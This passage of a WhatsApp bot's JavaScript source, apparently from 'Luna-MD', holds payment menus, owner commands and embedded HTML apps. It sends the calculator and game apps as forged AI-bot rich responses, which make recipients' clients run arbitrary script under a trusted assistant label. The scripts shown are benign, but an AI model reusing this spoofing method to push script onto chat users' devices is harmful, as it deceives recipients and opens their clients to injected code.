      degreesLatitude: 0,
      degreesLongitude: 0,
      name: `${global.botname}`,
      address: "Payment",
      jpegThumbnail: pay
    },
    contentText: teks,
    footerText: `© Luna-MD`,
    buttons: [
      {
        buttonId: "menu",
        buttonText: {
          displayText: "💳 pilih metode pembayaran"
        },
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "Luna Payment",
            sections: [
              {
                title: "Pilih metode pembayaran",
                highlight_label: "🔥",
                rows: [
                  {
                    header: "",
                    title: "Qris",
                    description: `${global.namaqris}`,
                    id: ".qris",
                  },
                  {
                    header: "",
                    title: "Dana",
                    description: `${global.dana}`,
                    id: ".dana",
                  },
                  {
                    header: "",
                    title: "Gopay",
                    description: `${global.gopay}`,
                    id: ".gopay",
                  },
                  {
                    header: "",
                    title: "Ovo",
                    description: `${global.ovo}`,
                    id: ".ovo",
                  },
                  {
                    title: "Shoopepay",
                    description: `${global.shoopepay}`,
                    id: ".shoopepay",
                  }
                ]
              }
            ]
          })
        }, 
        type: 1
      }
    ],
    headerType: 6
  }
}, 
)}
break

case "dana": {
const paymentImage = path.join(__dirname, "media", "payment", "dana.jpg")
const teks = `
*PAYMENT DANA*

*Nomor :* ${global.dana}
*Atas Nama :* ${global.andana}

*[ ! ] Penting :* Wajib kirimkan bukti transfer demi keamanan bersama.
`
if (!fs.existsSync(paymentImage)) return m.reply("error di case dana")

const imgsc = await prepareWAMessageMedia(
  { image: fs.readFileSync(paymentImage) },
  { upload: luna.waUploadToServer }
)

const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessageV2Extension: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        header: proto.Message.InteractiveMessage.Header.fromObject({
          hasMediaAttachment: true,
          ...imgsc
        }),
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: teks
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [{
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "copy dana",
              id: "copy_dana",
              copy_code: String(global.dana)
            })
          }]
        })
      })
    }
  }
}, { userJid: m.sender, quoted: qpayment })

await luna.relayMessage(m.chat, msgii.message, {
  messageId: msgii.key.id
})
}
break

case "ovo": {
const paymentImage = path.join(__dirname, "media", "payment", "ovo.jpg")
const teks = `
*PAYMENT OVO*

*Nomor :* ${global.ovo}
*Atas Nama :* ${global.anovo}

*[ ! ] Penting :* Wajib kirimkan bukti transfer demi keamanan bersama.
`
if (!fs.existsSync(paymentImage)) return m.reply("error di case ovo")

const imgsc = await prepareWAMessageMedia(
  { image: fs.readFileSync(paymentImage) },
  { upload: luna.waUploadToServer }
)

const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessageV2Extension: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        header: proto.Message.InteractiveMessage.Header.fromObject({
          hasMediaAttachment: true,
          ...imgsc
        }),
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: teks
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [{
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "copy ovo",
              id: "copy_ovo",
              copy_code: String(global.ovo)
            })
          }]
        })
      })
    }
  }
}, { userJid: m.sender, quoted: qpayment })

await luna.relayMessage(m.chat, msgii.message, {
  messageId: msgii.key.id
})
}
break

case "gopay": {
const paymentImage = path.join(__dirname, "media", "payment", "gopay.jpg")
const teks = `
*PAYMENT GOPAY*

*Nomor :* ${global.gopay}
*Atas Nama :* ${global.angopay}

*[ ! ] Penting :* Wajib kirimkan bukti transfer demi keamanan bersama.
`
if (!fs.existsSync(paymentImage)) return m.reply("error di case gopay")

const imgsc = await prepareWAMessageMedia(
  { image: fs.readFileSync(paymentImage) },
  { upload: luna.waUploadToServer }
)

const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessageV2Extension: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        header: proto.Message.InteractiveMessage.Header.fromObject({
          hasMediaAttachment: true,
          ...imgsc
        }),
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: teks
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [{
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "copy gopay",
              id: "copy_gopay",
              copy_code: String(global.gopay)
            })
          }]
        })
      })
    }
  }
}, { userJid: m.sender, quoted: qpayment })

await luna.relayMessage(m.chat, msgii.message, {
  messageId: msgii.key.id
})
}
break

case "shoopepay":
case "shopepay": {
const paymentImage = path.join(__dirname, "media", "payment", "shoopepay.jpg")
const teks = `
*PAYMENT SHOOPEPAY*

*Nomor :* ${global.shoopepay}
*Atas Nama :* ${global.anshoope}

*[ ! ] Penting :* Wajib kirimkan bukti transfer demi keamanan bersama.
`
if (!fs.existsSync(paymentImage)) return m.reply("error di case shoopepay")

const imgsc = await prepareWAMessageMedia(
  { image: fs.readFileSync(paymentImage) },
  { upload: luna.waUploadToServer }
)

const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessageV2Extension: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        header: proto.Message.InteractiveMessage.Header.fromObject({
          hasMediaAttachment: true,
          ...imgsc
        }),
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: teks
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [{
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "copy shoopepay",
              id: "copy_shoopepay",
              copy_code: String(global.shoopepay)
            })
          }]
        })
      })
    }
  }
}, { userJid: m.sender, quoted: qpayment })

await luna.relayMessage(m.chat, msgii.message, {
  messageId: msgii.key.id
})
}
break

case "qris": {
const paymentImage = path.join(__dirname, "media", "payment", "qris.jpg")
const teks = `${global.namaqris}\n\n*[ ! ] Penting :* Wajib kirimkan bukti transfer demi keamanan bersama.`
if (!fs.existsSync(paymentImage)) return m.reply("error di case qris")
await luna.sendMessage(m.chat, { image: fs.readFileSync(paymentImage), caption: teks }, { quoted: qpayment })
}
break

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

case "proses": {
if (!isOwner) return reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await luna.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: `${global.source}`,
}}}, {quoted: null})
}
break

case "done": {
if (!isOwner) return reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await luna.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: `${global.source}`,
}}}, {quoted: null})
}
break

case "developerbot": case "owner": {
await luna.sendContact(m.chat, [global.owner], m)
}
break

case "save": case "sv": {
if (!isOwner) return
await luna.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION ${global.botname}*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

case "public": {
if (!isOwner) return
luna.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

case "restart": case "rst": {
if (!isOwner) return reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

case "clearchat": case "clc": {
if (!isOwner) return reply(mess.owner)
luna.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
luna.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

case "delowner": case "delown": {
if (!isOwner) return reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

case "addowner": case "addown": {
if (!isOwner) return reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("628xxx"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

case "jadibot": {
    const targetNumber = String(text || "").trim().replace(/[^0-9]/g, "")

    if (!targetNumber) {
        return m.reply(`❌ example: .jadibot 628xxx`)
    }

    if (!/^62\d{8,15}$/.test(targetNumber)) {
        return m.reply(`❌ Format nomor tidak valid.\n\nGunakan format internasional tanpa tanda + atau spasi.\nContoh: .jadibot 628xxx`)
    }

    const result = await jadibotManager.start(luna, targetNumber, module.exports, m)
    if (result.message) await m.reply(result.message)
}
break

case "bataljadibot": {
    const targetNumber = String(args[1] || "").trim().replace(/[^0-9]/g, "")

    let result
    if (targetNumber) {
        result = await jadibotManager.cancelByTarget(targetNumber, m.sender)
    } else {
        result = await jadibotManager.cancelByRequester(m.sender)
    }

    if (result.unauthorized) return m.reply(result.message)
    if (!result.ok) return m.reply(result.message || "❌ Proses Jadibot tidak ditemukan.")

    const number = result.number || targetNumber
    await m.reply(`✅ *Jadibot ${number ? number + ' ' : ''}berhasil dibatalkan*`)
}
break

case "stopjadibot": {
    const targetJid = m.sender
    const active = jadibotManager.entries?.get?.(targetJid)

    if (!active) {
        return m.reply("❌ Kamu tidak memiliki Jadibot yang aktif.")
    }

    try {
        await m.reply("⏹️ *Jadibot sedang dihentikan...*\n\nSession clone akan dihapus dan koneksi akan ditutup.")
    } catch (error) {
    }

    await jadibotManager.stop(targetJid, true)
}
break

case "listjadibot": {
    if (!isOwner) return reply(mess.owner)

    const active = await jadibotManager.listActive()
    if (!active.length) return m.reply(`╭─〔 *LIST JADIBOT* 〕\n│ Tidak ada Jadibot aktif.\n│ Limit: *${jadibotManager.max} orang*\n╰──────────────`)

    let teks = `╭─〔 *LIST JADIBOT AKTIF* 〕\n`
    for (const item of active) {
        teks += `│ ${item.no}. @${item.number} — *${item.status}*\n`
    }
    teks += `├──────────────\n│ Aktif: *${active.length}/${jadibotManager.max} orang*\n╰──────────────`

    await luna.sendMessage(m.chat, {
        text: teks,
        mentions: active.map(item => item.jid)
    }, { quoted: m })
}
break

// kalkulator rich 
case "calculator":
case "kalkulator": {
    const html = String.raw`
<style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@700;900&display=swap');

    * {
        -webkit-tap-highlight-color: transparent;
        -webkit-user-select: none;
        user-select: none;
        box-sizing: border-box;
    }
</style>

<body
    style="
        margin: 0;
        background: #0A0A0F;
        font-family: 'Roboto', Arial, sans-serif;
        color: #fff;
        touch-action: manipulation;
    "
>
    <div
        style="
            width: 100%;
            max-width: 420px;
            margin: auto;
            padding: 16px;
        "
    >
        <div
            style="
                background: linear-gradient(180deg, #111118 0%, #0A0A0F 100%);
                border: 2px solid #2A2A35;
                border-radius: 18px;
                padding: 20px;
                box-shadow: 0 0 25px rgba(0, 140, 255, .12);
            "
        >
            <div
                style="
                    font-size: 11px;
                    letter-spacing: 2px;
                    color: #00A2FF;
                    margin-bottom: 8px;
                    font-weight: 900;
                "
            >
                LUNA CALCULATOR
            </div>

            <div
                id="display"
                style="
                    background: #16161F;
                    border: 2px solid #2E2E3A;
                    border-radius: 12px;
                    padding: 18px;
                    margin-bottom: 16px;
                    text-align: right;
                    font-size: 32px;
                    font-weight: 900;
                    min-height: 60px;
                    word-wrap: break-word;
                    box-shadow: inset 0 0 15px rgba(0, 0, 0, .4);
                "
            >
                0
            </div>

            <div
                id="sub"
                style="
                    text-align: right;
                    font-size: 14px;
                    color: #8A8A9E;
                    margin-top: -12px;
                    margin-bottom: 16px;
                    height: 18px;
                "
            >
                
            </div>

            <div
                style="
                    display: grid;
                    grid-template-columns: repeat(4, 1fr);
                    gap: 10px;
                "
            >
                <button class="btn op" data-v="C">C</button>
                <button class="btn op" data-v="DEL">⌫</button>
                <button class="btn op" data-v="%">%</button>
                <button class="btn op" data-v="/">÷</button>

                <button class="btn num" data-v="7">7</button>
                <button class="btn num" data-v="8">8</button>
                <button class="btn num" data-v="9">9</button>
                <button class="btn op" data-v="*">×</button>

                <button class="btn num" data-v="4">4</button>
                <button class="btn num" data-v="5">5</button>
                <button class="btn num" data-v="6">6</button>
                <button class="btn op" data-v="-">−</button>

                <button class="btn num" data-v="1">1</button>
                <button class="btn num" data-v="2">2</button>
                <button class="btn num" data-v="3">3</button>
                <button class="btn op" data-v="+">+</button>

                <button
                    class="btn num"
                    data-v="0"
                    style="grid-column: span 2"
                >
                    0
                </button>

                <button class="btn num" data-v=".">.</button>
                <button class="btn eq" data-v="=">=</button>
            </div>
        </div>
    </div>

    <style>
        .btn {
            border: none;
            border-radius: 10px;
            padding: 16px;
            font-size: 20px;
            font-weight: 900;
            cursor: pointer;
            transition: .15s;
            background: #1F1F29;
            color: #fff;
            border: 1px solid #2E2E3A;
        }

        .btn:active {
            transform: scale(.92);
        }

        .num:hover {
            background: #25252F;
        }

        .op {
            background: #23232E;
            color: #00A2FF;
        }

        .op:hover {
            background: #2A2A35;
            box-shadow: 0 0 10px rgba(0, 162, 255, .3);
        }

        .eq {
            background: linear-gradient(135deg, #00A2FF, #0080FF);
            color: #fff;
            box-shadow: 0 0 15px rgba(0, 162, 255, .4);
        }

        .eq:hover {
            filter: brightness(1.15);
        }
    </style>

    <script>
        let expr = '',
            display = document.getElementById('display'),
            sub = document.getElementById('sub');

        function update() {
            display.textContent = expr || '0';
        }

        /*
         * Parser matematika.
         * Tidak menggunakan eval() atau Function().
         */
        function calculateExpression(input) {
            let index = 0;

            input = input
                .replace(/×/g, '*')
                .replace(/÷/g, '/')
                .replace(/−/g, '-')
                .replace(/\s+/g, '');

            function parseExpression() {
                let value = parseTerm();

                while (index < input.length) {
                    let op = input[index];

                    if (op !== '+' && op !== '-') {
                        break;
                    }

                    index++;

                    let right = parseTerm();

                    if (op === '+') {
                        value += right;
                    } else {
                        value -= right;
                    }
                }

                return value;
            }

            function parseTerm() {
                let value = parseFactor();

                while (index < input.length) {
                    let op = input[index];

                    if (
                        op !== '*' &&
                        op !== '/' &&
                        op !== '%'
                    ) {
                        break;
                    }

                    index++;

                    let right = parseFactor();

                    if (op === '*') {
                        value *= right;
                    } else if (op === '/') {
                        if (right === 0) {
                            throw new Error('Division by zero');
                        }

                        value /= right;
                    } else if (op === '%') {
                        if (right === 0) {
                            throw new Error('Division by zero');
                        }

                        value %= right;
                    }
                }

                return value;
            }

            function parseFactor() {
                if (input[index] === '+') {
                    index++;
                    return parseFactor();
                }

                if (input[index] === '-') {
                    index++;
                    return -parseFactor();
                }

                if (input[index] === '(') {
                    index++;

                    let value = parseExpression();

                    if (input[index] !== ')') {
                        throw new Error('Invalid expression');
                    }

                    index++;

                    return value;
                }

                let start = index;
                let hasDot = false;

                while (index < input.length) {
                    let char = input[index];

                    if (char >= '0' && char <= '9') {
                        index++;
                        continue;
                    }

                    if (char === '.') {
                        if (hasDot) {
                            throw new Error('Invalid number');
                        }

                        hasDot = true;
                        index++;
                        continue;
                    }

                    break;
                }

                if (start === index) {
                    throw new Error('Invalid expression');
                }

                let number = Number(input.slice(start, index));

                if (!isFinite(number)) {
                    throw new Error('Invalid number');
                }

                return number;
            }

            let result = parseExpression();

            if (index !== input.length) {
                throw new Error('Invalid expression');
            }

            if (!isFinite(result)) {
                throw new Error('Invalid result');
            }

            return result;
        }

        function calc() {
            try {
                let res = calculateExpression(expr);

                sub.textContent = expr + ' =';
                expr = String(res);
            } catch (e) {
                expr = 'Error';

                setTimeout(() => {
                    expr = '';
                    update();
                }, 1200);
            }

            update();
        }

        document.querySelectorAll('.btn').forEach(b => {
            b.onclick = () => {
                let v = b.dataset.v;

                if (v === 'C') {
                    expr = '';
                    sub.textContent = ' ';
                }

                else if (v === 'DEL') {
                    expr = expr.slice(0, -1);
                }

                else if (v === '=') {
                    calc();
                    return;
                }

                else {
                    expr += v;
                }

                update();
            }
        });
    </script>
</body>
    `;

    const data = {
        response_id: "PopiooNixelPopiooNixelPopiooNixel",

        sections: [
            {
                __typename: "GenAIUnifiedResponseSection",

                view_model: {
                    __typename: "GenAISingleLayoutViewModel",

                    primitive: {
                        __typename: "GenAIBotProgressStatusPrimitive",
                        title: "KLIK TEKS INI",
                        is_in_progress: true
                    }
                }
            }
        ],

        embedded_screens: [
            {
                title: "Preview",

                content: [
                    {
                        __typename: "FOAIDNixelButtonSheets",

                        tabs: [
                            {
                                id: "tab_0",
                                tab_header: "Luna-MD",

                                sections: [
                                    {
                                        __typename: "GenAIUnifiedResponseSection",

                                        view_model: {
                                            __typename: "GenAISingleLayoutViewModel",

                                            primitive: {
                                                __typename: "GenAIaeacdsnwHtmlPrimitive",
                                                payload: html,
                                                url: "https://example.com",
                                                trusted_sources: [
                                                    "example.com"
                                                ]
                                            }
                                        }
                                    }
                                ],

                                step_entries: []
                            }
                        ]
                    }
                ]
            }
        ]
    };

    await luna.relayMessage(
        m.chat,
        {
            messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,

                botMetadata: {
                    messageDisclaimerText: "",
                    richResponseSourcesMetadata: {}
                }
            },

            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,

                        unifiedResponse: {
                            data: Buffer
                                .from(JSON.stringify(data))
                                .toString('base64')
                        },

                        contextInfo: {
                            forwardingScore: 1,
                            isForwarded: true,

                            forwardedAiBotMessageInfo: {
                                botJid: "0@bot"
                            },

                            forwardOrigin: 4
                        }
                    }
                }
            }
        },

        {
            messageId: await luna.generateMessageTag()
        }
    );
}
break

// game rich
case "pesawat": 
case "plane": {
const html = `<style>
* { -webkit-tap-highlight-color: transparent; -webkit-user-select: none; user-select: none; -webkit-touch-callout: none; box-sizing: border-box; margin: 0; padding: 0; }
body { margin: 0; background: transparent; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #fff; touch-action: none; overflow: hidden; }
.wrapper { width: 100%; max-width: 480px; margin: auto; padding: 12px; }
.card { background: linear-gradient(180deg, rgba(15,18,26,0.97), rgba(10,12,18,0.97)); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 2px solid #3b82f6; border-radius: 20px; overflow: hidden; box-shadow: 0 14px 44px rgba(0,0,0,0.75), inset 0 0 40px rgba(59,130,246,0.1); padding: 14px; position: relative; }
.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
.title { font-size: 10px; letter-spacing: 1.5px; color: #60a5fa; font-weight: 800; text-transform: uppercase; display:flex; align-items:center; gap:6px; }
.title .dot{ width:6px; height:6px; border-radius:50%; background:#10b981; box-shadow:0 0 8px #10b981; animation: pulse 1.4s infinite; }
@keyframes pulse{ 0%,100%{opacity:1} 50%{opacity:.3} }
.score-badge { font-size: 20px; font-weight: 900; color: #60a5fa; text-shadow: 0 0 12px rgba(96,165,250,0.5); font-variant-numeric: tabular-nums; }
.best-badge { font-size: 10px; color: #94a3b8; font-variant-numeric: tabular-nums; }
.stat-row { display:flex; gap:8px; margin-bottom:8px; }
.stat-pill { flex:1; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.08); border-radius:10px; padding:5px 8px; text-align:center; }
.stat-pill .lbl{ font-size:8px; letter-spacing:1px; color:#64748b; text-transform:uppercase; font-weight:700; }
.stat-pill .val{ font-size:13px; font-weight:900; color:#fff; font-variant-numeric: tabular-nums; }
#game-container { position: relative; width: 100%; height: 350px; border-radius: 14px; overflow: hidden; border: 2px solid #1e293b; box-shadow: inset 0 0 30px rgba(0,0,0,0.6); }
canvas { width: 100%; height: 100%; display: block; background: #070a12; }
.controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
.btn { padding: 14px; font-size: 15px; font-weight: 800; border: none; border-radius: 12px; cursor: pointer; color: #fff; text-align: center; letter-spacing: 0.5px; position: relative; overflow: hidden; }
.btn-left { background: linear-gradient(135deg, #3b82f6, #2563eb); box-shadow: 0 4px 16px rgba(59,130,246,0.45), inset 0 1px 0 rgba(255,255,255,0.2); }
.btn-right { background: linear-gradient(135deg, #ec4899, #db2777); box-shadow: 0 4px 16px rgba(236,72,153,0.45), inset 0 1px 0 rgba(255,255,255,0.2); }
.btn:active { transform: scale(0.95); filter: brightness(0.9); }
.credit-bar { margin-top: 10px; text-align: center; font-size: 10px; font-weight: 800; letter-spacing: 1.5px; color: #94a3b8; text-transform: uppercase; border-top: 1px dashed rgba(255,255,255,0.12); padding-top: 8px; }
.credit-bar span { color: #60a5fa; text-shadow: 0 0 10px rgba(96,165,250,0.5); }
</style>
<body>
<div class="wrapper">
  <div class="card">
    <div class="header">
      <div>
        <div class="title"><span class="dot"></span>Luna-MD</div>
        <h2 style="font-size: 17px; font-weight: 900; color: #fff; margin-top:2px;">Space Rush 🚀</h2>
      </div>
      <div style="text-align: right;">
        <div class="score-badge" id="score">0000</div>
        <div class="best-badge" id="best">BEST 0000</div>
      </div>
    </div>
    <div class="stat-row">
      <div class="stat-pill"><div class="lbl">Kills</div><div class="val" id="killsStat">0</div></div>
      <div class="stat-pill"><div class="lbl">Combo</div><div class="val" id="comboStat">x1</div></div>
      <div class="stat-pill"><div class="lbl">Coins</div><div class="val" id="coinsStat">0</div></div>
    </div>
    <div id="game-container">
      <canvas id="c"></canvas>
    </div>
    <div class="controls">
      <button class="btn btn-left" id="leftBtn">⬅️ LEFT</button>
      <button class="btn btn-right" id="rightBtn">RIGHT ➡️</button>
    </div>
    <div class="credit-bar">
      Engineered by <span>Luna-MD • 2026</span> ⚡
    </div>
  </div>
</div>
<script>
(function() {
  var cvs = document.getElementById('c');
  var ctx = cvs.getContext('2d');
  var scoreEl = document.getElementById('score');
  var bestEl = document.getElementById('best');
  var killsStatEl = document.getElementById('killsStat');
  var comboStatEl = document.getElementById('comboStat');
  var coinsStatEl = document.getElementById('coinsStat');
  var W = 360;
  var H = 350;
  cvs.width = W;
  cvs.height = H;
  var ROAD_L = 20, ROAD_R = W - 20;
  var laneCount = 4;
  var laneW = (ROAD_R - ROAD_L) / laneCount;
  var lanes = [];
  for (var li = 0; li < laneCount; li++) lanes.push(ROAD_L + laneW * (li + 0.5));
  var currentLane = 1;
  var targetX = lanes[currentLane];
  var playerX = lanes[currentLane];
  var playerY = H - 65;
  var score = 0;
  var best = 0;
  var kills = 0;
  var coinCount = 0;
  var combo = 1;
  var comboTimer = 0;
  var shake = 0;
  var flashAlpha = 0;
  try { best = parseInt(localStorage.getItem('plane_best_v1') || '0', 10) || 0; } catch(e){}
  bestEl.textContent = 'BEST ' + String(best).padStart(4, '0');
  var bullets = [];
  var enemies = [];
  var coins = [];
  var particles = [];
  var stars = [];
  var gameOver = false;
  var shootTimer = 0;
  for (var s = 0; s < 40; s++) {
    stars.push({ x: Math.random() * W, y: Math.random() * H, size: Math.random() * 2 + 1, speed: Math.random() * 2 + 1 });
  }
  function spawnEnemy() {
    var laneIdx = Math.floor(Math.random() * laneCount);
    var isMeteor = Math.random() < 0.45;
    enemies.push({
      lane: laneIdx,
      x: lanes[laneIdx],
      y: -40,
      w: isMeteor ? 34 : 28,
      h: isMeteor ? 34 : 32,
      hp: isMeteor ? 999 : 1,
      isMeteor: isMeteor,
      speed: isMeteor ? 2.2 + Math.random() * 1.5 : 1.8 + Math.random() * 1.2
    });
  }
  function explode(x, y, color, count) {
    count = count || 20;
    for (var i = 0; i < count; i++) {
      var angle = Math.random() * Math.PI * 2;
      var spd = 1 + Math.random() * 5;
      particles.push({
        x: x, y: y,
        vx: Math.cos(angle) * spd,
        vy: Math.sin(angle) * spd,
        color: color,
        life: 1,
        size: 2 + Math.random() * 3
      });
    }
  }
  function drawSpaceCraft(x, y) {
    ctx.save();
    ctx.translate(x, y);
    var flameH = 12 + Math.random() * 8;
    var gradFlame = ctx.createLinearGradient(0, 15, 0, 15 + flameH);
    gradFlame.addColorStop(0, '#38bdf8');
    gradFlame.addColorStop(0.5, '#f59e0b');
    gradFlame.addColorStop(1, 'transparent');
    ctx.fillStyle = gradFlame;
    ctx.fillRect(-10, 15, 5, flameH);
    ctx.fillRect(5, 15, 5, flameH);
    ctx.fillStyle = '#1e3a8a';
    ctx.beginPath();
    ctx.moveTo(-12, 10);
    ctx.lineTo(-20, 18);
    ctx.lineTo(-8, 15);
    ctx.closePath();
    ctx.fill();
    ctx.beginPath();
    ctx.moveTo(12, 10);
    ctx.lineTo(20, 18);
    ctx.lineTo(8, 15);
    ctx.closePath();
    ctx.fill();
    ctx.fillStyle = '#2563eb';
    ctx.beginPath();
    ctx.moveTo(0, -10);
    ctx.lineTo(26, 12);
    ctx.lineTo(12, 14);
    ctx.lineTo(0, 8);
    ctx.lineTo(-12, 14);
    ctx.lineTo(-26, 12);
    ctx.closePath();
    ctx.fill();
    ctx.strokeStyle = '#60a5fa';
    ctx.lineWidth = 1.5;
    ctx.beginPath();
    ctx.moveTo(-26, 12);
    ctx.lineTo(0, -10);
    ctx.lineTo(26, 12);
    ctx.stroke();
    ctx.fillStyle = '#0284c7';
    ctx.fillRect(-12, 2, 4, 12);
    ctx.fillRect(8, 2, 4, 12);
    ctx.fillStyle = '#ef4444';
    ctx.fillRect(-25, 5, 2, 8);
    ctx.fillRect(23, 5, 2, 8);
    var gradBody = ctx.createLinearGradient(0, -28, 0, 16);
    gradBody.addColorStop(0, '#e0f2fe');
    gradBody.addColorStop(0.4, '#38bdf8');
    gradBody.addColorStop(1, '#1e40af');
    ctx.fillStyle = gradBody;
    ctx.beginPath();
    ctx.moveTo(0, -28);
    ctx.lineTo(7, -8);
    ctx.lineTo(6, 16);
    ctx.lineTo(-6, 16);
    ctx.lineTo(-7, -8);
    ctx.closePath();
    ctx.fill();
    ctx.fillStyle = '#06b6d4';
    ctx.beginPath();
    ctx.ellipse(0, -6, 3.5, 9, 0, 0, Math.PI * 2);
    ctx.fill();
    ctx.fillStyle = '#ffffff';
    ctx.beginPath();
    ctx.ellipse(-1, -8, 1, 3, Math.PI / 4, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();
  }
  function drawMeteor(x, y, size) {
    ctx.save();
    ctx.translate(x, y);
    ctx.fillStyle = '#78350f';
    ctx.strokeStyle = '#451a03';
    ctx.lineWidth = 2;
    ctx.beginPath();
    var points = 7;
    for (var i = 0; i < points; i++) {
      var angle = (i / points) * Math.PI * 2;
      var r = size / 2 + ((i % 2 === 0) ? 3 : -3);
      var px = Math.cos(angle) * r;
      var py = Math.sin(angle) * r;
      if (i === 0) ctx.moveTo(px, py); else ctx.lineTo(px, py);
    }
    ctx.closePath();
    ctx.fill();
    ctx.stroke();
    ctx.restore();
  }
  function drawAlien(x, y) {
    ctx.save();
    ctx.translate(x, y);
    ctx.fillStyle = '#10b981';
    ctx.beginPath();
    ctx.arc(0, 0, 12, 0, Math.PI * 2);
    ctx.fill();
    ctx.fillStyle = '#059669';
    ctx.fillRect(-14, 2, 28, 5);
    ctx.fillStyle = '#ffffff';
    ctx.fillRect(-5, -4, 4, 4);
    ctx.fillRect(1, -4, 4, 4);
    ctx.restore();
  }
  var spawnCounter = 0;
  function update() {
    ctx.save();
    if (shake > 0) {
      var sx = (Math.random() - 0.5) * shake;
      var sy = (Math.random() - 0.5) * shake;
      ctx.translate(sx, sy);
      shake *= 0.88;
      if (shake < 0.5) shake = 0;
    }
    ctx.clearRect(-10, -10, W + 20, H + 20);
    ctx.fillStyle = '#ffffff';
    for (var s = 0; s < stars.length; s++) {
      var st = stars[s];
      if (!gameOver) st.y = (st.y + st.speed) % H;
